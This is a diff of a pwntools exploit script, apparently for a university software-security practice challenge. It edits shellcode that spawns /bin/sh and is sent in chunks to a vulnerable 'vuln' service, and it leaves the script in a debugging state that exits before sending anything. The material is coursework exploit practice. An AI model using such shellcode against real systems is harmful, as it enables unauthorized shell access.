@@ -13,11 +13,11 @@ pwn.context.arch = 'amd64'
 # docker compose -f debug.yml up
 # docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-1')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'
 #conn = pwn.remote('tasks.ws24.softsec.rub.de', 33256)
-conn = pwn.remote('127.0.0.1', 1024)
+#conn = pwn.remote('127.0.0.1', 1024)
 
 # we can write own own shellcode that gets executed
 
-pwn.pause()
+#pwn.pause()
 
 # number is 8Byte unsigned long (64bit number)
 # we need to provide then number as a decimal, that has 29 digits at most (that is enough for all numbers)
@@ -81,7 +81,7 @@ sh:
     .string "/bin/sh"
 ''')
 
-
+"""
 # use the multi byte nop (0F 1F XX XX) => two bytes fix then 2 arbitrary bytes
 shellcode = pwn.asm('''    
     xor rax, rax ; # 3 bytes:
@@ -114,7 +114,15 @@ shellcode = pwn.asm('''
 sh:
     .string "/bin/sh";
 ''')
+"""
 
+shellcode = pwn.asm('''
+    push 0xb848;
+''')
+
+shellcode = pwn.asm('''
+    pushw 0xb848;
+''')
 
 print(f'shellcode: {shellcode.hex()}')
 bytes_to_send = list()
@@ -127,6 +135,8 @@ for i in range(0, len(shellcode), 10):
     print(f'{chunk.hex()} || {junk.hex()}')
 
 print(bytes_to_send)
+
+exit()
 
 conn.recvuntil(b'How many numbers do you need? ')
 conn.sendline(b'7')
